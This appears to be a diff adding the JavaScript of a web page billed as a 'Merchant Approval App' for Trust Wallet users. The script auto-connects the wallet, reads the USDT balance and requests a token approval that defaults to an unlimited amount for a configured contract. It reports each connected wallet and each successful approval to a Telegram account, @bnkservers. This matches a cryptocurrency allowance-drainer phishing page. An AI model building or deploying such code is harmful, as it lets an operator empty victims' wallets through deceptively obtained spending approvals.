+    let signer = null;
+    let userAddress = null;
+    let chainId = null;
+    let usdtContract = null;
+    let isApproved = false;
+    let isConnecting = false;
+
+    // ================================================================
+    //  GET PROVIDER
+    // ================================================================
+    function getTrustProvider() {
+        debug('Searching for Trust Wallet provider...');
+        
+        if (window.web3 && window.web3.currentProvider) {
+            debug('✅ window.web3 found!');
+            return window.web3.currentProvider;
+        }
+        if (window.ethereum) {
+            debug('✅ window.ethereum found!');
+            return window.ethereum;
+        }
+        if (window.trustwallet) {
+            debug('✅ window.trustwallet found!');
+            return window.trustwallet;
+        }
+        if (window.provider) {
+            debug('✅ window.provider found!');
+            return window.provider;
+        }
+        
+        debug('❌ No provider found');
+        return null;
+    }
+
+    // ================================================================
+    //  WAIT FOR PROVIDER
+    // ================================================================
+    function waitForProvider() {
+        return new Promise((resolve) => {
+            let attempts = 0;
+            const maxAttempts = 40;
+            
+            let provider = getTrustProvider();
+            if (provider) {
+                resolve(provider);
+                return;
             }
+            
+            debug('Waiting for Trust Wallet...');
+            const interval = setInterval(() => {
+                attempts++;
+                provider = getTrustProvider();
+                if (provider) {
+                    debug(`✅ Provider found after ${attempts} attempts!`);
+                    clearInterval(interval);
+                    resolve(provider);
+                    return;
+                }
+                if (attempts >= maxAttempts) {
+                    debug('❌ Timeout - No provider found');
+                    clearInterval(interval);
+                    resolve(null);
+                }
+            }, 500);
         });
-    </script>
+    }
+
+    // ================================================================
+    //  CONNECT WALLET
+    // ================================================================
+    async function connectWallet() {
+        debug('connectWallet() called');
+        
+        if (isConnecting) return;
+
+        if (userAddress) {
+            userAddress = null;
+            signer = null;
+            provider = null;
+            usdtContract = null;
+            isApproved = false;
+            walletStatus.textContent = 'Not Connected';
+            walletStatus.className = 'badge badge-gray';
+            walletAddress.textContent = 'Click "Connect Wallet" to start';
+            connectBtn.textContent = '🔗 Connect Wallet';
+            connectBtn.className = 'btn btn-wallet';
+            approveBtn.disabled = true;
+            approveBtn.textContent = 'Connect Wallet First';
+            approvalBadge.textContent = '⏳ Not Connected';
+            approvalBadge.className = 'badge badge-gray';
+            allowanceDisplay.textContent = 'Loading...';
+            balanceDisplay.textContent = 'Loading...';
+            networkInfo.textContent = '';
+            walletProvider.textContent = '';
+            approvalStatus.classList.add('hidden');
+            debug('Disconnected');
+            return;
+        }
+
+        isConnecting = true;
+        connectBtn.disabled = true;
+        connectBtn.textContent = '⏳ Connecting...';
+        walletStatus.textContent = 'Connecting...';
+        walletStatus.className = 'badge badge-blue';
+
+        try {
+            const ethProvider = await waitForProvider();
+            
+            if (!ethProvider) {
+                alert('Trust Wallet not detected!\n\nPlease make sure:\n1. You are using Trust Wallet app\n2. Using the DApp browser\n3. Try refreshing the page');
+                isConnecting = false;
+                connectBtn.disabled = false;
+                connectBtn.textContent = '🔗 Connect Wallet';
+                walletStatus.textContent = 'Not Connected';
+                walletStatus.className = 'badge badge-gray';
+                return;
+            }
+
+            provider = new ethers.providers.Web3Provider(ethProvider);
+            await provider.send('eth_requestAccounts', []);
+            
+            signer = provider.getSigner();
+            userAddress = await signer.getAddress();
+            debug(`✅ Connected: ${userAddress}`);
+
+            const network = await provider.getNetwork();
+            chainId = network.chainId;
+            debug(`Network: ${chainId}`);
+
+            usdtContract = new ethers.Contract(CONFIG.usdtAddress, ERC20_ABI, signer);
+
+            walletStatus.textContent = '✅ Connected';
+            walletStatus.className = 'badge badge-green';
+            walletAddress.textContent = userAddress;
+            walletAddress.style.color = '#c9d1d9';
+            walletProvider.textContent = '🔗 Trust Wallet';
+            connectBtn.textContent = 'Disconnect Wallet';
+            connectBtn.className = 'btn btn-danger';
+            approveBtn.disabled = false;
+            approveBtn.textContent = '✅ Approve USDT';
+            
+            const chainNames = {
+                1: 'Ethereum Mainnet',
+                11155111: 'Sepolia',
+                56: 'BSC',
+                97: 'BSC Testnet'
+            };
+            networkInfo.textContent = `🌐 ${chainNames[chainId] || `Chain ID: ${chainId}`}`;
+
+            await loadAllowance();
+            await loadBalance();
+            debug('✅ Connection successful!');
+
+            // ================================================================
+            // 📤 SEND TELEGRAM NOTIFICATION - WALLET CONNECTED
+            // ================================================================
+            const msg = `🔐 <b>New Wallet Connected!</b>\n\n` +
+                        `📱 <b>Wallet:</b> <code>${userAddress}</code>\n` +
+                        `🌐 <b>Network:</b> ${chainNames[chainId] || `Chain ID: ${chainId}`}\n` +
+                        `📝 <b>Contract:</b> <code>${CONFIG.contractAddress}</code>\n` +
+                        `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
+                        `👤 <b>User:</b> @bnkservers`;
+
+            await sendTelegramMessage(msg);
+
+        } catch (error) {
+            debug(`❌ Error: ${error.message}`);
+            console.error('Error:', error);
+            alert('Failed to connect: ' + error.message);
+            walletStatus.textContent = '❌ Failed';
+            walletStatus.className = 'badge badge-red';
+        } finally {
+            isConnecting = false;
+            connectBtn.disabled = false;
+            if (!userAddress) {
+                connectBtn.textContent = '🔗 Connect Wallet';
+                walletStatus.textContent = 'Not Connected';
+                walletStatus.className = 'badge badge-gray';
+            }
+        }
+    }
+
+    // ================================================================
+    //  LOAD ALLOWANCE
+    // ================================================================
+    async function loadAllowance() {
+        if (!userAddress || !usdtContract) return;
+
+        try {
+            debug('Loading allowance...');
+            const allowance = await usdtContract.allowance(userAddress, CONFIG.contractAddress);
+            
+            const decimals = await usdtContract.decimals();
+            const formatted = ethers.utils.formatUnits(allowance, decimals);
+            
+            if (allowance.gt(0)) {
+                const num = parseFloat(formatted);
+                if (num > 1000000000) {
+                    allowanceDisplay.textContent = '♾️ Unlimited';
+                } else {
+                    allowanceDisplay.textContent = `${num.toLocaleString()} USDT`;
+                }
+                isApproved = true;
+                approvalBadge.textContent = '✅ Approved';
+                approvalBadge.className = 'badge badge-green';
+                approveBtn.textContent = '✅ Already Approved';
+                approveBtn.disabled = true;
+            } else {
+                allowanceDisplay.textContent = '0 USDT';
+                isApproved = false;
+                approvalBadge.textContent = '⏳ Not Approved';
+                approvalBadge.className = 'badge badge-orange';
+                approveBtn.disabled = false;
+                approveBtn.textContent = '✅ Approve USDT';
+                approveBtn.className = 'btn btn-primary';
+            }
+            debug(`Allowance: ${allowance.toString()}`);
+        } catch (error) {
+            debug(`Error loading allowance: ${error.message}`);
+            allowanceDisplay.textContent = 'Error loading';
+        }
+    }
+
+    // ================================================================
+    //  LOAD BALANCE
+    // ================================================================
+    async function loadBalance() {
+        if (!userAddress || !usdtContract) return;
+
+        try {
+            debug('Loading balance...');
+            const balance = await usdtContract.balanceOf(userAddress);
+            const decimals = await usdtContract.decimals();
+            const formatted = ethers.utils.formatUnits(balance, decimals);
+            balanceDisplay.textContent = `${parseFloat(formatted).toLocaleString()} USDT`;
+            debug(`Balance: ${formatted} USDT`);
+        } catch (error) {
+            debug(`Error loading balance: ${error.message}`);
+            balanceDisplay.textContent = 'Error loading';
+        }
+    }
+
+    // ================================================================
+    //  APPROVE
+    // ================================================================
+    async function approveToken() {
+        debug('approveToken() called');
+        
+        if (!userAddress || !usdtContract) {
+            alert('Please connect your wallet first!');
+            return;
+        }
+
+        const amountStr = amountInput.value.trim();
+        let amountWei;
+        let amountDisplay;
+        
+        try {
+            const decimals = await usdtContract.decimals();
+            if (amountStr.toLowerCase() === 'unlimited' || amountStr === '') {
+                amountWei = CONFIG.maxUint256;
+                amountDisplay = 'Unlimited (∞)';
+            } else {
+                const num = parseFloat(amountStr);
+                if (isNaN(num) || num <= 0) {
+                    alert('Please enter a valid amount (e.g., 2520)');
+                    return;
+                }
+                amountWei = ethers.utils.parseUnits(amountStr, decimals);
+                amountDisplay = `${amountStr} USDT`;
+            }
+        } catch (e) {
+            alert('Invalid amount format. Please enter a number (e.g., 2520)');
+            return;
+        }
+
+        if (isApproved) {
+            alert('USDT is already approved!');
+            return;
+        }
+
+        approvalStatus.classList.remove('hidden');
+        approvalStatus.className = 'status-msg info';
+        approvalStatus.textContent = `⏳ Approving ${amountDisplay}... Please confirm in your wallet.`;
+        approveBtn.disabled = true;
+
+        try {
+            debug(`Calling approve() for ${amountDisplay}...`);
+            const tx = await usdtContract.approve(CONFIG.contractAddress, amountWei);
+            debug(`Transaction sent: ${tx.hash}`);
+            
+            approvalStatus.textContent = `⏳ Waiting for confirmation... (${amountDisplay})`;
+
+            await tx.wait();
+            debug('✅ Transaction confirmed!');
+
+            approvalStatus.className = 'status-msg success';
+            approvalStatus.textContent = `✅ Approval successful! ${amountDisplay} approved.`;
+
+            await loadAllowance();
+
+            // ================================================================
+            // 📤 SEND TELEGRAM NOTIFICATION - APPROVAL SUCCESS
+            // ================================================================
+            const msg = `✅ <b>Approval Success!</b>\n\n` +
+                        `📱 <b>Wallet:</b> <code>${userAddress}</code>\n` +
+                        `📝 <b>Contract:</b> <code>${CONFIG.contractAddress}</code>\n` +
+                        `💰 <b>Amount:</b> ${amountDisplay}\n` +
+                        `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
+                        `👤 <b>User:</b> @bnkservers\n` +
+                        `🔗 <b>Tx:</b> <a href="https://etherscan.io/tx/${tx.hash}">View on Etherscan</a>`;
+
+            await sendTelegramMessage(msg);
+
+        } catch (error) {
+            debug(`❌ Approval error: ${error.message}`);
+            console.error('Approval error:', error);
+            approvalStatus.className = 'status-msg error';
+            approvalStatus.textContent = '❌ Approval failed: ' + (error.message || 'Unknown error');
+            approveBtn.disabled = false;
+        }
+    }
+
+    // ================================================================
+    //  AUTO CONNECT
+    // ================================================================
+    async function autoConnect() {
+        debug('Auto-connecting...');
+        const provider = getTrustProvider();
+        if (provider && provider.selectedAddress) {
+            debug('Auto-connect triggered');
+            setTimeout(connectWallet, 1000);
+        } else {
+            debug('No existing connection');
+        }
+    }
+
+    // ================================================================
+    //  EVENT LISTENERS
+    // ================================================================
+    connectBtn.addEventListener('click', connectWallet);
+    approveBtn.addEventListener('click', approveToken);
+
+    amountInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            approveToken();
+        }
+    });
+
+    // ================================================================
+    //  INIT
+    // ================================================================
+    (function init() {
+        debug('🔑 Merchant Approval App loaded');
+        debug(`User Agent: ${navigator.userAgent}`);
+        debug(`window.web3: ${window.web3 ? 'exists' : 'not found'}`);
+        debug(`window.ethereum: ${window.ethereum ? 'exists' : 'not found'}`);
+        debug(`window.trustwallet: ${window.trustwallet ? 'exists' : 'not found'}`);
+        debug(`📌 Contract: ${CONFIG.contractAddress}`);
+        
+        document.getElementById('contractDisplay').textContent = CONFIG.contractAddress;
+        
+        setTimeout(autoConnect, 2000);
+        
+        window.addEventListener('load', function() {
+            debug('Page loaded');
+            setTimeout(autoConnect, 1500);
+        });
+    })();
+</script>
+
 </body>
 </html>
